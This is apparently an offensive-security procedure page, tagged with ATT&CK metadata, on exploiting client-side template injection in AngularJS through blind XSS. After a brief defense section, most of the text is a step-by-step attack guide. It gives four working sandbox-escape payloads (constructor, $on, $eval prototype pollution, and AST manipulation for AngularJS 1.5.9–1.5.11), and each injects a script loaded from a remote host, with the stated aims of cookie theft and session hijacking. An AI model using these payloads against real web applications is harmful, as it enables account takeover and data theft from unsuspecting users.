---
id: fde678fa-0e1a-4379-8b9a-2c7c504e9fa8
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:43.766059+00:00'
updated_at: '2023-04-10T20:24:53.109447+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques: []
tags:
  - '[[tags/Blind XSS]]'
  - '[[tags/Client Side Template Injection]]'
  - '[[tags/XSS in Angular and AngularJS]]'
commands: []
tools: []
platforms:
  - Web
  - Browser
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Client-Side-Template-Injection-using-Blind-XSS

## Summary

This procedure demonstrates how to exploit Client-Side Template Injection (CSTI) vulnerabilities using blind XSS payloads to inject and execute arbitrary JavaScript in a victim's browser. It targets web applications using client-side templating engines like AngularJS, where user input is unsafely interpolated, allowing attackers to break out of the template context and load external scripts without immediate feedback.

## Description

Client-Side Template Injection occurs when user-supplied input is passed to a client-side templating engine without proper sanitization, enabling attackers to inject malicious template expressions that evaluate to JavaScript code. In blind XSS scenarios, the payload executes silently without visible output, making it suitable for stealthy attacks like session hijacking or data exfiltration. This procedure focuses on AngularJS-specific bypasses and prototype pollution techniques to achieve code execution, typically by creating and appending a script element that loads a remote payload from an attacker-controlled server (e.g., //localhost/m). The attack assumes the target is a modern web application with AngularJS versions vulnerable to such injections, and it can lead to full browser compromise, including cookie theft or keylogging.

## Requirements

1. Access to a vulnerable web application using a client-side templating framework like AngularJS (e.g., via user input fields, URL parameters, or search boxes).
2. Ability to submit input that reaches the template engine without server-side filtering.
3. An attacker-controlled server hosting the malicious JavaScript payload (e.g., a simple script to exfiltrate data).
4. Browser developer tools or a proxy like Burp Suite for testing and interception.
5. Knowledge of the templating syntax (e.g., {{ }} in AngularJS).

## Defense

- Implement strict input validation and sanitization on all user inputs before passing to client-side templates, using libraries like DOMPurify.
- Enforce Content Security Policy (CSP) headers to block inline scripts and restrict external script sources (e.g., script-src 'self').
- Avoid using client-side templating for untrusted data; prefer server-side rendering where possible.
- Regularly conduct security testing, including fuzzing for template injection payloads, and monitor for anomalous network requests to external domains.
- Update to modern frameworks like Angular (non-JS) that mitigate these issues, and enable Angular's strict contextual escaping.

## Objectives

1. Identify and confirm a CSTI vulnerability in the client-side template engine.
2. Inject obfuscated JavaScript payloads to bypass filters and execute arbitrary code blindly.
3. Load an external script to perform actions like data theft or persistence in the victim's browser session.
4. Achieve session hijacking or sensitive data exfiltration without triggering visible alerts.

## Instructions

### Step 1: Identify Vulnerable Template Injection Point

**Context**: Locate an input field, URL parameter, or form that interpolates user data into a client-side template (e.g., AngularJS {{expression}}). Test with simple payloads like {{7*7}} to confirm execution (output should be 49 if vulnerable).

Submit test inputs via the browser or proxy to observe if the template evaluates the expression.

**Expected Output**: Numeric result or altered page behavior confirming template evaluation.

### Step 2: Inject Basic Constructor Bypass Payload

**Context**: Use a constructor-based payload to break out of the template and execute JavaScript that creates a script element loading from your server. This targets standard AngularJS template contexts.

**Payload** ([[codes/AngularJS-Constructor-Bypass-Script-Injection]]):

```javascript
{{
    constructor.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()
}}
```

Submit the payload in the vulnerable input. Monitor your server for incoming requests from the victim's browser.

**Expected Output**: No visible change on the page (blind), but a network request to //localhost/m from the target browser.

### Step 3: Exploit $on Constructor for Event-Based Injection

**Context**: If the basic constructor is filtered, use AngularJS's $on method to access the constructor and inject the script. This is useful for event handler contexts in templates.

**Payload** ([[codes/AngularJS-On-Constructor-Script-Injection]]):

```javascript
{{
    $on.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()
}}
```

Inject via the same input point and verify by checking server logs for the script load.

**Expected Output**: Silent execution; confirm via external callback in the loaded script (e.g., beacon to attacker server).

### Step 4: Use $eval with Prototype Pollution Bypass

**Context**: For applications with additional filters on constructors, pollute the String prototype to hijack $eval and execute code. This leverages JavaScript's prototype chain to inject the script creation.

**Payload** ([[codes/AngularJS-Eval-Prototype-Pollution-Script-Injection]]):

```javascript
{{
    a="a"["constructor"].prototype;a.charAt=a.trim;
    $eval('a",eval(`var _=document\x2ecreateElement(\'script\');
    _\x2esrc=\'//localhost/m\';
    document\x2ebody\x2eappendChild(_);`),"')
}}
```

Submit and monitor for execution indicators like data exfiltration callbacks.

**Expected Output**: External script loaded without page disruption.

### Step 5: Advanced AST Manipulation for Strict AngularJS Versions

**Context**: In AngularJS 1.5.9-1.5.11, manipulate the Abstract Syntax Tree (AST) via $evalAsync to bypass sandboxing and inject the payload. This is for highly restricted environments.

**Payload** ([[codes/AngularJS-AST-Manipulation-Script-Injection]]):

```javascript
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;
    c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\''script\\');_.src=\\'//localhost/m\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

Inject and use a listener on your server to confirm.

**Expected Output**: Payload executes asynchronously; verify via loaded script's actions (e.g., sending victim cookies).
